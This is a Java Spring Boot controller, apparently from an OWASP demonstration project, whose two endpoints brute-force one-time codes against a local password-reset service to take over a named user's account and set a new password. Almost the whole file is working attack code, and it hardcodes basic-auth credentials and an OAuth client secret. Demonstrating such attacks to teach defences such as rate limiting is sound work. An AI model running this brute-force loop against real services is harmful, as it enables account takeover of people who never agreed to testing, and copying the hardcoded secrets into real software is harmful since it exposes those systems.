package com.grid.owasp.owasp;


import lombok.extern.slf4j.Slf4j;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.http.client.support.BasicAuthenticationInterceptor;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestTemplate;

import java.net.URISyntaxException;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

@Slf4j
@RestController
@RequestMapping("/credentialstuffing")
public class CredentialStuffingController {


    String hostUrl = "http://localhost:8080/";

    @PostMapping("/v1/attack")
    public ResponseEntity<String> bruteForceAttackV1(@RequestParam String userName, @RequestParam String newPassword) throws URISyntaxException {

        HttpHeaders headers = new HttpHeaders();
        headers.set("Accept", "*/*");
        headers.set("Accept-Encoding", "gzip, deflate, br");
        headers.set("Connection", "keep-alive");
        headers.set("userName", userName);
        headers.set("newPassword", newPassword);
        headers.setBearerAuth("pass");
        headers.add("accept", "application/json");
        headers.add("Authorization", "Basic dXNlcjpwYXNz");


        MultiValueMap<String, String> requestBody = new LinkedMultiValueMap<>();
        requestBody.add("client_id", "aViwaUZXir44tcdmr6bg7m");
        requestBody.add("client_secret", "65d952744a49774bcf24bcd32c521619");
        requestBody.add("grant_type", "client_credentials");
        requestBody.add("username", "user");
        requestBody.add("password", "pass");


        requestBody.add("Accept", "*/*");
        requestBody.add("Accept-Encoding", "gzip, deflate, br");
        requestBody.add("Connection", "keep-alive");
        requestBody.add("userName", userName);
        requestBody.add("newPassword", newPassword);
        requestBody.add("accept", "application/json");
        requestBody.add("Authorization", "Basic dXNlcjpwYXNz");

        for (int i = 0; i <= 999; i++) {
            try {
                RestTemplate restTemplate = new RestTemplate();
                restTemplate.getInterceptors().add(new BasicAuthenticationInterceptor("user", "pass"));
                //String endpoint = hostUrl + "v1/reset-password?userName=";
                String endpoint = hostUrl + "v1/reset-password?";

                HttpEntity<?> request = new HttpEntity<>(requestBody, headers);

                //String url = endpoint + userName + "&otpCode=" + i + "&newPassword=" + newPassword;
                String url = endpoint + "otpCode=" + i;

                ResponseEntity<String> result = restTemplate.postForEntity(url, request, String.class);

                log.info("OtpCode " + i + " is CORRECT!");
                if (result.hasBody() && Objects.requireNonNull(result.getBody()).contains("success")) {
                    log.info("Result: " + result + " ATTACK is successful and password reset for user: " +
                            userName + " with new password: " + newPassword + " with otpCode: " + i);
                    return ResponseEntity.ok("ATTACK is successful and password reset for user: " +
                            userName + " with new password: " + newPassword);
                }
            } catch (Exception e) {
                log.info("OtpCode " + i + " is incorrect");
            }
        }
        return ResponseEntity.ok("ATTACK is not successful for user: " + userName);
    }

    @PostMapping("/v2/attack")
    public ResponseEntity<String> bruteForceAttackV2(@RequestParam String username, @RequestParam String newPassword) throws URISyntaxException {

        HttpHeaders headers = new HttpHeaders();
        headers.set("Accept", "*/*");
        headers.set("Accept-Encoding", "gzip, deflate, br");
        headers.set("Connection", "keep-alive");
        headers.set("userName", username);
        headers.set("newPassword", newPassword);
        headers.setBearerAuth("pass");
        headers.add("accept", "application/json");
        headers.add("Authorization", "Basic dXNlcjpwYXNz");


        MultiValueMap<String, String> requestBody = new LinkedMultiValueMap<>();
        requestBody.add("client_id", "aViwaUZXir44tcdmr6bg7m");
        requestBody.add("client_secret", "65d952744a49774bcf24bcd32c521619");
        requestBody.add("grant_type", "client_credentials");
        requestBody.add("username", "user");
        requestBody.add("password", "pass");


        requestBody.add("Accept", "*/*");
        requestBody.add("Accept-Encoding", "gzip, deflate, br");
        requestBody.add("Connection", "keep-alive");
        requestBody.add("userName", username);
        requestBody.add("newPassword", newPassword);
        requestBody.add("accept", "application/json");
        requestBody.add("Authorization", "Basic dXNlcjpwYXNz");

        for (int i = 100; i <= 150; i++) {
            try {
                RestTemplate restTemplate = new RestTemplate();
                restTemplate.getInterceptors().add(new BasicAuthenticationInterceptor("user", "pass"));
                String endpoint = hostUrl + "v2/reset-password?userName=";

                HttpEntity<?> request = new HttpEntity<>(requestBody, headers);

                String url = endpoint + username + "&otpCode=" + i + "&newPassword=" + newPassword;
                ResponseEntity<String> result = restTemplate.postForEntity(url, request, String.class);

                log.info("OtpCode " + i + " is CORRECT!");
                if (result.hasBody() && Objects.requireNonNull(result.getBody()).contains("success")) {
                    log.info("Result: " + result + " ATTACK is successful and password reset for user: " +
                            username + " with new password: " + newPassword + " with otpCode: " + i);
                    return ResponseEntity.ok("ATTACK is successful and password reset for user: " +
                            username + " with new password: " + newPassword);
                }
            } catch (Exception e) {
                log.info("OtpCode " + i + " is incorrect");
            }
        }
        Map<String, String> errorDetails = new HashMap<>();
        errorDetails.put("ErrorMessage", "ATTACK is not successful for user: " + username);
        return new ResponseEntity(errorDetails, HttpStatus.TOO_MANY_REQUESTS);
    }

}
